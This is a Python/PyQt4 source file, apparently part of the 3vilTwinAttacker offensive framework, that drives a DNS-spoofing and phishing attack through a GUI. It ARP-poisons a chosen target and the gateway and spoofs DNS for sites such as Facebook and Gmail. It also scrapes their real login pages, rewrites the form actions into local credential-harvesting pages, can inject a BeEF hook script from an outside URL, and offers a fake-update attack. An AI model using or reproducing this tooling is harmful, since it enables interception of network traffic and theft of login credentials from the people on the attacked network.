#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from Core.Settings import frm_Settings
from Modules.ModuleUpdateFake import frm_update_attack
from Modules.utils import ProcessThread,Refactor,Beef_Hook_url,ThDnsSpoofAttack,ThARP_posion
from Modules.ModuleArpPosion import ThreadScan
from os import popen,chdir,getcwd,devnull,system
from scapy.all import *
import threading
from urllib2 import urlopen,URLError
from multiprocessing import Process,Manager
from socket import gaierror
from subprocess import Popen,PIPE,STDOUT
from re import search
threadloading = {'template':[],'dnsspoof':[],'arps':[]}

class MainDnsSpoof(QMainWindow):
    def __init__(self, parent=None):
        super(MainDnsSpoof, self).__init__(parent)
        self.form_widget = frm_DnsSpoof(self)
        self.setCentralWidget(self.form_widget)

class frm_DnsSpoof(QWidget):
    def __init__(self, parent=None):
        super(frm_DnsSpoof, self).__init__(parent)
        self.setWindowTitle('Dns Spoof Attack')
        self.setWindowIcon(QIcon('rsc/icon.ico'))
        self.Main       = QVBoxLayout()
        self.owd        = getcwd()
        self.control    = False
        self.interfaces = Refactor.get_interfaces()
        self.configure  = frm_Settings()
        self.loadtheme(self.configure.XmlThemeSelected())
        self.network    = Refactor
        self.data       = {'IPaddress':[], 'Hostname':[], 'MacAddress':[]}
        self.ThreadDirc = {'dns_spoof':[]}
        global threadloading
        self.GUI()

    def closeEvent(self, event):
        if len(self.ThreadDirc['dns_spoof']) != 0:
            reply = QMessageBox.question(self, 'About Exit Dns spoof',
                'Are you sure to close Dns spoof?', QMessageBox.Yes |
                QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes:
                event.accept()
                for i in self.ThreadDirc['dns_spoof']:
                    i.stop(),i.terminate()
                for i in threadloading['template']:
                    i.stop(),i.join()
                    threadloading['template'] = []
                self.deleteLater()
            else:
                event.ignore()

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def GUI(self):
        self.form =QFormLayout()
        self.layoutform = QFormLayout()
        self.movie = QMovie('rsc/loading2.gif', QByteArray(), self)
        size = self.movie.scaledSize()
        self.setGeometry(200, 200, size.width(), size.height())
        self.movie_screen = QLabel()
        self.movie_screen.setFixedHeight(200)
        self.movie_screen.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.movie_screen.setAlignment(Qt.AlignCenter)
        self.movie.setCacheMode(QMovie.CacheAll)
        self.movie.setSpeed(100)
        self.movie_screen.setMovie(self.movie)
        self.movie_screen.setDisabled(False)

        self.movie.start()
        self.tables = QTableWidget(5,3)
        self.tables.setRowCount(100)
        self.tables.setFixedHeight(200)
        self.tables.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.tables.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.tables.clicked.connect(self.list_clicked_scan)
        self.tables.resizeColumnsToContents()
        self.tables.resizeRowsToContents()
        self.tables.horizontalHeader().resizeSection(1,120)
        self.tables.horizontalHeader().resizeSection(0,145)
        self.tables.horizontalHeader().resizeSection(2,158)
        self.tables.verticalHeader().setVisible(False)
        Headers = []
        for key in reversed(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)

        self.ip_range = QLineEdit(self)
        self.txt_gateway = QLineEdit(self)
        self.txt_redirect = QLineEdit(self)
        self.txt_target = QLineEdit(self)
        self.ComboIface = QComboBox(self)
        n = self.interfaces['all']
        for i,j in enumerate(n):
            if n[i] != '':
                self.ComboIface.addItem(n[i])
        self.layoutform.addRow('Target:',self.txt_target)
        self.layoutform.addRow('gateway:',self.txt_gateway)
        self.layoutform.addRow('Redirect IP:',self.txt_redirect)
        self.layoutform.addRow('Range Scan:',self.ip_range)
        self.layoutform.addRow('Interface:',self.ComboIface)
        self.myListDns = QListWidget(self)
        try:
            items = [
                'google.com:'+(str(Popen(['/bin/ping','-c1',
                '-w100', 'google.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
                'facebook.com:'+(str(Popen(['/bin/ping','-c1',
                '-w100', 'facebook.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
                'gmail.com:'+(str(Popen(['/bin/ping','-c1',
                '-w100', 'gmail.com'], stdout=PIPE).stdout.read()).split()[2]).replace(')','').replace('(',''),
            ]
            for i in items:
                item = QListWidgetItem()
                item.setText(i)
                item.setSizeHint(QSize(30,30))
                self.myListDns.addItem(item)
        except Exception:
            pass
        self.myListDns.setMinimumWidth(self.myListDns.sizeHintForColumn(100))
        self.myListDns.setContextMenuPolicy(Qt.CustomContextMenu)
        self.myListDns.connect(self.myListDns,
        SIGNAL('customContextMenuRequested(QPoint)' ),
        self.listItemclicked)

        self.txt_status_scan = QLabel('')
        self.txt_statusarp = QLabel('')
        self.txt_status_phishing = QLabel('')

        self.StatusMonitor(False,'stas_scan')
        self.StatusMonitor(False,'dns_spoof')
        self.StatusMonitor(False,'stas_phishing')
        scan_range = self.configure.xmlSettings('scan','rangeIP',None,False)
        self.ip_range.setText(scan_range)

        # button conf
        self.btn_start_scanner = QPushButton('Scan')
        self.btn_stop_scanner = QPushButton('Stop')
        self.btn_Attack_Posion = QPushButton('Start Attack')
        self.btn_Stop_Posion = QPushButton('Stop Attack')
        self.btn_server = QPushButton('Templates')
        self.btn_windows_update = QPushButton('Fake Update')
        self.btn_server.setFixedHeight(22)
        self.btn_stop_scanner.setFixedWidth(100)
        self.btn_start_scanner.setFixedWidth(100)
        self.btn_start_scanner.setFixedHeight(22)
        self.btn_stop_scanner.setFixedHeight(22)
        self.btn_windows_update.setFixedHeight(22)
        self.btn_server.setIcon(QIcon('rsc/page.png'))


        # connet buttons
        self.btn_start_scanner.clicked.connect(self.Start_scan)
        self.btn_stop_scanner.clicked.connect(self.Stop_scan)
        self.btn_Attack_Posion.clicked.connect(self.Start_Attack)
        self.btn_Stop_Posion.clicked.connect(self.kill_attack)
        self.btn_server.clicked.connect(self.show_template_dialog)
        self.btn_windows_update.clicked.connect(self.show_frm_fake)

        #icons
        self.btn_start_scanner.setIcon(QIcon('rsc/network.png'))
        self.btn_Attack_Posion.setIcon(QIcon('rsc/start.png'))
        self.btn_Stop_Posion.setIcon(QIcon('rsc/Stop.png'))
        self.btn_stop_scanner.setIcon(QIcon('rsc/network_off.png'))
        self.btn_windows_update.setIcon(QIcon('rsc/winUp.png'))

        # grid status modules
        self.grid0 = QGridLayout()
        self.grid0.minimumSize()
        self.grid0.addWidget(QLabel('DnsSpoof:'),0,2)
        self.grid0.addWidget(QLabel('Phishing:'),0,4)
        self.grid0.addWidget(QLabel('Scanner:'),0,0)
        self.grid0.addWidget(self.txt_status_scan,0,1)
        self.grid0.addWidget(self.txt_statusarp,0,3)
        self.grid0.addWidget(self.txt_status_phishing,0,5)

        # grid options
        self.grid1 = QGridLayout()
        self.grid1.addWidget(self.btn_start_scanner,0,0)
        self.grid1.addWidget(self.btn_stop_scanner,0,1)
        self.grid1.addWidget(self.btn_server,0,2)
        self.grid1.addWidget(self.btn_windows_update, 0,3)

        #btn start and stop
        self.grid2 = QGridLayout()
        self.grid2.addWidget(self.btn_Attack_Posion,1,0)
        self.grid2.addWidget(self.btn_Stop_Posion,1,5)

        x  = self.interfaces
        if x['gateway'] != None:
            self.txt_gateway.setText(x['gateway'])
            self.txt_redirect.setText(x['IPaddress'])

        self.form0  = QGridLayout()
        self.form0.addWidget(self.movie_screen,0,0)
        self.form0.addWidget(self.tables,0,0)

        self.layout = QHBoxLayout()
        self.layout.addWidget(self.myListDns)
        self.layout.addLayout(self.layoutform)

        self.form.addRow(self.grid0)
        self.form.addRow(self.grid1)
        self.form.addRow(self.grid2)

        self.Main.addLayout(self.form0)
        self.Main.addLayout(self.layout)
        self.Main.addLayout(self.form)
        self.setLayout(self.Main)

    def listItemclicked(self,pos):
        item = self.myListDns.selectedItems()
        self.listMenu= QMenu()
        menu = QMenu()
        additem = menu.addAction('Add Host')
        removeitem = menu.addAction('Remove Host')
        clearitem = menu.addAction('clear all')
        action = menu.exec_(self.myListDns.viewport().mapToGlobal(pos))
        if action == removeitem:
            if item != []:
                self.myListDns.takeItem(self.myListDns.currentRow())
        elif action == additem:
            text, resp = QInputDialog.getText(self, 'Add DNS',
            'Enter the DNS and IP for spoof hosts: ex: facebook.com:31.13.65.1')
            if resp:
                try:
                    host, ip = text.split(':')
                    itemsexits = []
                    for index in xrange(self.myListDns.count()):
                        itemsexits.append(str(self.myListDns.item(index).text()))
                    for i in itemsexits:
                        if search(str(host+':'+ip),i):
                            QMessageBox.information(self,'Dns Rsolver','this DNS already exist on List Attack')
                            return
                    item = QListWidgetItem()
                    item.setText(host+':'+ip)
                    item.setSizeHint(QSize(30,30))
                    self.myListDns.addItem(item)
                except gaierror,e:
                    QMessageBox.information(self,'error',str(e))
                    return
        elif action == clearitem:
            self.myListDns.clear()

    def thread_scan_reveice(self,info_ip):
        self.StatusMonitor(False,'stas_scan')
        self.movie_screen.setDisabled(False)
        self.tables.setVisible(True)
        data = info_ip.split('|')
        Headers = []
        self.data['IPaddress'].append(data[0])
        self.data['MacAddress'].append(data[1])
        self.data['Hostname'].append(data[2])
        for n, key in enumerate(reversed(self.data.keys())):
            Headers.append(key)
            for m, item in enumerate(self.data[key]):
                item = QTableWidgetItem(item)
                item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                self.tables.setItem(m, n, item)
        Headers = []
        for key in reversed(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)


    def show_frm_fake(self):
        self.n = frm_update_attack()
        self.n.setGeometry(QRect(100, 100, 450, 300))
        self.n.show()

    def emit_template(self,log):
        if log == 'started':
            self.StatusMonitor(True,'stas_phishing')

    def show_template_dialog(self):
        self.j = frm_template()
        self.connect(self.j,SIGNAL('Activated ( QString ) '), self.emit_template)
        self.j.setWindowTitle('Templates Phishing Attack')
        self.j.txt_redirect.setText(self.txt_redirect.text())
        self.j.show()

    def kill_attack(self):
        for i in self.ThreadDirc['dns_spoof']:
            try:
                i.stop()
                i.terminate()
            except:
                pass
        for i in threadloading['template']:i.stop(),i.join()
        for i in threadloading['arps']:i.stop()
        try:
            self.ThreadScanner.terminate()
        except:
            pass
        threadloading['template'] = []
        threadloading['arps'] = []
        self.ThreadDirc['dns_spoof'] = []
        chdir(self.owd)
        self.StatusMonitor(False,'dns_spoof')
        self.StatusMonitor(False,'stas_phishing')
        self.Reiptables()

    @pyqtSlot(QModelIndex)
    def check_options(self,index):
        if self.check_face.isChecked():
            self.check_route.setChecked(False)
            self.check_gmail.setChecked(False)

        elif self.check_gmail.isChecked():
            self.check_face.setChecked(False)
            self.check_route.setChecked(False)
        else:
            self.check_face.setChecked(False)
            self.check_gmail.setChecked(False)

    def StopArpAttack(self,data):
        if data == 'finished':
            self.StatusMonitor(False,'dns_spoof')
    def Start_Attack(self):
        self.targets = {}
        if (len(self.txt_target.text()) and  len(self.txt_gateway.text())) == 0:
            QMessageBox.warning(self, 'Error Dnsspoof', 'you need set the input correctly')
        else:
            if (len(self.txt_target.text()) and len(self.txt_gateway.text())) and len(self.txt_redirect.text()) != 0:
                if len(self.txt_redirect.text()) != 0:
                    self.domains = []
                    if self.myListDns.count() == 0:
                        QMessageBox.warning(self, 'Error DNS', 'Any host found, you need to add hosts.')
                        return
                    for index in xrange(self.myListDns.count()):
                        self.domains.append(str(self.myListDns.item(index).text()))
                    for i in self.domains:
                        self.targets[i.split(':')[0]] = (i.split(':')[1]).replace('\n','')
                    self.domains = []
                    Refactor.set_ip_forward(1)
                    arp_target = ThARP_posion(str(self.txt_gateway.text()),str(self.txt_target.text()))
                    arp_target.setName('Arp Posion:: [target]')
                    arp_target.setDaemon(True)
                    threadloading['arps'].append(arp_target)
                    arp_target.start()

                    arp_gateway = ThARP_posion(str(self.txt_target.text()),str(self.txt_gateway.text()))
                    arp_gateway.setName('Arp Posion:: [gateway]')
                    arp_gateway.setDaemon(True)
                    threadloading['arps'].append(arp_gateway)
                    arp_gateway.start()

                    thr = ThDnsSpoofAttack(self.targets,
                    str(self.ComboIface.currentText()),'udp port 53',True,str(self.txt_redirect.text()))
                    thr.redirection()
                    self.connect(thr,SIGNAL('Activated ( QString ) '), self.StopArpAttack)
                    thr.setObjectName('Dns Spoof')
                    self.ThreadDirc['dns_spoof'].append(thr)
                    thr.start()
                    self.StatusMonitor(True,'dns_spoof')

    def Reiptables(self):
        rules = [
        'iptables --flush',
        'iptables --table nat --flush' ,
        'iptables --delete-chain',
        'iptables --table nat --delete-chain']
        for delete in rules: popen(delete)
        Refactor.set_ip_forward(0)

    def Start_scan(self):
        self.StatusMonitor(True,'stas_scan')
        threadscan_check = self.configure.xmlSettings('advanced','Function_scan',None,False)
        self.tables.clear()
        self.data = {'IPaddress':[], 'Hostname':[], 'MacAddress':[]}
        if threadscan_check == 'Nmap':
            try:
                from nmap import PortScanner
            except ImportError:
                QMessageBox.information(self,'Error Nmap','The modules python-nmap not installed')
                return
            if self.txt_gateway.text() != '':
                self.movie_screen.setDisabled(True)
                self.tables.setVisible(False)
                config_gateway = str(self.txt_gateway.text())
                scan = ''
                config_gateway = config_gateway.split('.')
                del config_gateway[-1]
                for i in config_gateway:
                    scan += str(i) + '.'
                self.ThreadScanner = ThreadScan(scan + '0/24')
                self.connect(self.ThreadScanner,SIGNAL('Activated ( QString ) '), self.thread_scan_reveice)
                self.StatusMonitor(True,'stas_scan')
                self.ThreadScanner.start()
            else:
                QMessageBox.information(self,'Error in gateway','gateway not found.')

        elif threadscan_check == 'Ping':
            if self.txt_gateway.text() != '':
                config = str(self.txt_gateway.text())
                t = threading.Thread(target=self.scanner_network,args=(config,))
                t.daemon = True
                t.start(),t.join()
                self.StatusMonitor(False,'stas_scan')
            else:
                QMessageBox.information(self,'Error in gateway','gateway not found.')
        else:
            QMessageBox.information(self,'Error on select thread Scan','thread scan not selected.')

    def working(self,ip,lista):
        with open(devnull, 'wb') as limbo:
            result=subprocess.Popen(['ping', '-c', '1', '-n', '-W', '1', ip],
            stdout=limbo, stderr=limbo).wait()
            if not result:
                print('online',ip)
                lista[ip] = ip + '|' + self.network.get_mac(ip)

    def scanner_network(self,gateway):
        scan = ''
        config_gateway = gateway.split('.')
        del config_gateway[-1]
        for i in config_gateway:
            scan += str(i) + '.'
        gateway = scan
        ranger = str(self.ip_range.text()).split('-')
        jobs = []
        manager = Manager()
        on_ips = manager.dict()
        for n in xrange(int(ranger[0]),int(ranger[1])):
            ip='%s{0}'.format(n)%(gateway)
            p = Process(target=self.working,args=(ip,on_ips))
            jobs.append(p)
            p.start()
        for i in jobs: i.join()
        for i in on_ips.values():
            Headers = []
            n = i.split('|')
            self.data['IPaddress'].append(n[0])
            self.data['MacAddress'].append(n[1])
            self.data['Hostname'].append('<unknown>')
            for n, key in enumerate(reversed(self.data.keys())):
                Headers.append(key)
                for m, item in enumerate(self.data[key]):
                    item = QTableWidgetItem(item)
                    item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                    self.tables.setItem(m, n, item)
        Headers = []
        for key in reversed(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)

    def Stop_scan(self):
        self.ThreadScanner.terminate()
        self.StatusMonitor(False,'stas_scan')
        Headers = []
        for key in reversed(self.data.keys()):
            Headers.append(key)
        self.tables.setHorizontalHeaderLabels(Headers)
        self.tables.setVisible(True)

    def StatusMonitor(self,bool,wid):
        if bool and wid == 'stas_scan':
            self.txt_status_scan.setText('[ ON ]')
            self.txt_status_scan.setStyleSheet('QLabel {  color : green; }')
        elif not bool and wid == 'stas_scan':
            self.txt_status_scan.setText('[ OFF ]')
            self.txt_status_scan.setStyleSheet('QLabel {  color : red; }')
        elif bool and wid == 'dns_spoof':
            self.txt_statusarp.setText('[ ON ]')
            self.txt_statusarp.setStyleSheet('QLabel {  color : green; }')
        elif not bool and wid == 'dns_spoof':
            self.txt_statusarp.setText('[ OFF ]')
            self.txt_statusarp.setStyleSheet('QLabel {  color : red; }')
        elif bool and wid == 'stas_phishing':
            self.txt_status_phishing.setText('[ ON ]')
            self.txt_status_phishing.setStyleSheet('QLabel {  color : green; }')
        elif not bool and wid == 'stas_phishing':
            self.txt_status_phishing.setText('[ OFF ]')
            self.txt_status_phishing.setStyleSheet('QLabel {  color : red; }')


    @pyqtSlot(QModelIndex)
    def list_clicked_scan(self, index):
        item = self.tables.selectedItems()
        if item != []:
            self.txt_target.setText(item[0].text())
        else:
            self.txt_target.clear()

class frm_template(QDialog):
    def __init__(self, parent = None):
        super(frm_template, self).__init__(parent)
        self.label = QLabel()
        self.Main = QVBoxLayout(self)
        self.setGeometry(0, 0, 500, 100)
        self.center()
        self.control = None
        self.owd = getcwd()
        self.config = frm_Settings()
        self.loadtheme(self.config.XmlThemeSelected())
        global threadloading
        self.gui_temp()

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def gui_temp(self):
        self.frm0 = QFormLayout(self)
        self.frm1 = QFormLayout(self)
        self.check_face = QCheckBox('Facebook')
        self.check_gmail = QCheckBox('Gmail')
        self.check_route = QCheckBox('Router')
        self.check_beef = QCheckBox('Beef')
        self.check_custom = QCheckBox('Custom Phishing')
        self.EditBeef = QLineEdit(self)
        self.EditBeef.setEnabled(False)

        self.txt_html = QTextEdit(self)
        self.txt_html.setPlainText('<html>\n<head>\n<title>3vilTwinAttacker Phishing </title>'
        '\n</head>\n<body>\n'
        '\n<h3 align=\'center\'>3vilTwinAttacker Framework</h3>\n'
        '\n<p align=\'center\'>this is demo Attack Redirect.</p>\n'
        '\n</body>\n</html>')
        self.txt_html.setEnabled(False)
        # connect buton
        self.check_face.clicked.connect(self.check_options)
        self.check_gmail.clicked.connect(self.check_options)
        self.check_route.clicked.connect(self.check_options)
        self.check_beef.clicked.connect(self.check_options)
        self.check_custom.clicked.connect(self.check_options)

        self.txt_redirect =  QLineEdit(self)
        self.btn_start_template = QPushButton('Start Server HTTP')
        self.btn_start_template.clicked.connect(self.start_server)

        self.frm0.addRow(self.check_face)
        self.frm0.addRow(self.check_gmail)
        self.frm0.addRow(self.check_route)
        self.frm0.addRow(self.check_custom)
        h = QFrame(self)
        h.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        self.frm0.addRow(h)
        self.frm0.addRow(self.check_beef)
        self.frm0.addRow(QLabel('IP Redirect:'),self.txt_redirect)
        self.frm0.addRow("Beef Hook URL:",self.EditBeef)
        self.frm0.addRow(self.btn_start_template)

        layout = QHBoxLayout()
        layout.addWidget(self.txt_html)
        layout.addLayout(self.frm0)

        self.Main.addLayout(layout)
        self.setLayout(self.Main)

    def start_server(self):
        sock = None
        if self.check_face.isChecked():
            url = 'http://facebook.com'
            try:
                sock = urlopen(url).read()
                self.control = 'facebook'
            except URLError, e:
                QMessageBox.information(self,'Error',"Server not found, can't find the server at focebook." + str(e))
        elif self.check_gmail.isChecked():
            try:
                sock = urlopen('http://accounts.google.com/Login?hl').read()
                self.control = 'gmail'
            except URLError,e:
                QMessageBox.information(self,'Error',"Server not found, can't find the server at google." + str(e))
        elif self.check_route.isChecked():
            self.control = 'route'
        elif self.check_custom.isChecked():
            self.control = 'custom'
        else:
            QMessageBox.information(self,'Error','checkbox not checked.')

        if self.control != None:
            self.phishing_page(self.control,sock)
            if not len(threadloading['template']) == 0:
                self.deleteLater()


    def phishing_page(self,choice,sock):
            if choice == 'facebook':
                path = 'Modules/Phishing/Facebook/'
                try:
                    chdir(path)
                except OSError,e:
                    return None
                self.html = sock.replace('https://www.facebook.com/login.php?login_attempt=1', 'login.php')
                if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
                    self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
                    html_final = Beef_Hook_url(self.html,self.hook)
                    if html_final != None:
                        self.html = html_final
                    else: QMessageBox.information(self,'Error Hook Inject Page',
                        'Hook Url not injected, not found tag "<body>"')
                with open('index.html','w') as f:
                    f.write(str(self.html))
                    f.close()
            elif choice == 'route':
                path = 'Modules/Phishing/Route/'
                chdir(path)
            elif choice == 'custom':
                path = 'Modules/Phishing/Custom/'
                chdir(path)
                self.html = self.txt_html.toPlainText()
                if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
                    self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
                    html_final = Beef_Hook_url(self.html,self.hook)
                    if html_final != None:
                        self.html = html_final
                    else: QMessageBox.information(self,'Error Hook Inject Page',
                        'Hook Url not injected, not found tag <body>')
                with open('index.html','w') as f:
                    f.write(str(self.html))
                    f.close()
            elif choice == 'gmail':
                path = 'Modules/Phishing/Gmail/'
                try:
                    chdir(path)
                    request = urlopen('http://accounts.google.com/Login?hl').read()
                    self.html = request.replace('//ssl.gstatic.com/accounts/ui/','')
                    self.html = request.replace('https://accounts.google.com/ServiceLoginAuth','login.php')
                    if self.check_beef.isChecked() and len(self.EditBeef.text()) != 0:
                        self.hook = '<script type="text/javascript" src="%s"></script>'%self.EditBeef.text()
                        html_final = Beef_Hook_url(self.html,self.hook)
                        if html_final != None:
                            self.html = html_final
                        else: QMessageBox.information(self,'Error Hook Inject Page',
                            'Hook Url not injected, not found tag "<body>"')
                    with open('index.html','w') as f:
                        f.write(str(self.html))
                        f.close()
                except OSError,e:
                    return None

            ip = str(self.txt_redirect.text())
            popen('service apache2 stop')
            if ip != None:
                Tphishing = ProcessThread(['php', '-S',ip+':80'])
                Tphishing.setName('Phishing:'+choice)
                threadloading['template'].append(Tphishing)
                Tphishing.start()
                self.emit(SIGNAL('Activated( QString )'),'started')
            else:
                QMessageBox.information(self,'Connection','Ipaddress not found')

    @pyqtSlot(QModelIndex)
    def check_options(self,index):
        if self.check_face.isChecked():
            self.check_route.setChecked(False)
            self.check_gmail.setChecked(False)
        elif self.check_gmail.isChecked():
            self.check_face.setChecked(False)
            self.check_route.setChecked(False)
        else:
            self.check_face.setChecked(False)
            self.check_gmail.setChecked(False)

        if self.check_custom.isChecked():
            self.txt_html.setEnabled(True)
        else:
            self.txt_html.setEnabled(False)
        if self.check_beef.isChecked():
            self.EditBeef.setEnabled(True)
        else:
            self.EditBeef.setEnabled(False)
